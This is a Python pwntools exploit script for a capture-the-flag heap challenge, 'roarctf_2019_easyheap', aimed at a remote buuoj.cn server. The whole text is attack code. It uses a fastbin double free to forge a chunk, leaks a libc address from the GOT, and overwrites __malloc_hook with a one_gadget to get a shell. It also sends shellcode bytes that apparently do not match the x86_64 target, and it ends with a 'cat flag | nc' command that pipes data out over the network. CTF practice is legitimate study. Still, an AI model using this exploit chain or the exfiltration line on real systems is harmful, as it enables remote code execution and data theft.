from pwn import *
context.log_level='debug'
io=remote("node3.buuoj.cn",26317)
fake_chunk=0x602060
one_gadget=[0x45216,0x4526a,0xf02a4,0xf1147]
elf=ELF("roarctf_2019_easyheap")
read_got=elf.got["read"]
libc=ELF("/lib/x86_64-linux-gnu/libc.so.6")
def add1(size,content):
    io.recvuntil(">> ")
    io.sendline(b'1')
    io.recv()
    io.sendline(str(size))
    io.recvuntil("please input your content")
    io.sendline(content)
def add3(size,content):
    sleep(0.3)
    io.sendline(b'1')
    sleep(0.3)
    io.sendline(str(size))
    sleep(0.3)
    io.send(content)
def add2(content):
    io.recvuntil(">> ")
    io.sendline(b'666')
    io.recv()
    io.sendline(b'1')
    io.recvuntil("please input your content")
    io.send(content)
def add4(content):
    sleep(0.3)
    io.sendline(b'666')
    sleep(0.3)
    io.sendline(b'1')
    sleep(0.3)
    io.sendline(content)
def delete1():
    io.recvuntil(">> ")
    io.sendline(b'2')
def delete3():
    sleep(0.3)
    io.sendline(b'2')
def delete2():
    io.recvuntil(">> ")
    io.sendline(b'666')
    io.recv()
    io.sendline('2')
def delete4():
    sleep(0.3)
    io.sendline(b'666')
    sleep(0.3)
    io.sendline(b'2')
def show():
    io.recvuntil(">> ")
    io.sendline(b'3')
fake_chunk_size=0x71
io.recvuntil("username:")
io.send(p64(0)+p64(fake_chunk_size)+b'\x00'*0x10)
io.recv()
shellcode="\x01\x30\x8f\xe2\x13\xff\x2f\xe1\x78\x46\x0c\x30\xc0\x46\x01\x90\x49\x1a\x92\x1a\x0b\x27\x01\xdf\x2f\x62\x69\x6e\x2f\x73\x68"
io.send(shellcode)
add2('a')
add1(0x60,'a')
 
delete2()
add1(0x60,'a')
add1(0x60,'a')
delete1()
delete2()
delete1()
add1(0x60,p64(fake_chunk))
add1(0x60,b'a')
add1(0x60,b'a')
add1(0x60,b'a'*0x18+p64(read_got)+p64(0xDEADBEEFDEADBEEF))
show()
read_addr=u64(io.recvuntil('\x7f')[-6:].ljust(8,b'\x00'))
libc_base=read_addr-libc.sym["read"]
malloc_hook=libc_base+libc.sym["__malloc_hook"]
realloc=libc_base+libc.sym["realloc"]
one_gadget_addr=one_gadget[3]+libc_base
print("malloc_hook>   ",hex(malloc_hook))
sleep(0.3)
io.sendline("666")
add4('a')
add3(0x60,'a')
delete4()
add3(0x60,'a')
add3(0x60,'a')
delete3()
delete4()
delete3()
add3(0x60,p64(malloc_hook-0x23))
add3(0x60,'a')
add3(0x60,'a')
add3(0x60,b"\x00"*(0x13-8)+p64(one_gadget_addr)+p64(realloc+0x14))
io.sendline('1')
sleep(0.3)
io.sendline('16')
io.sendline("cat flag | nc 127.0.0.1 1234")
io.interactive()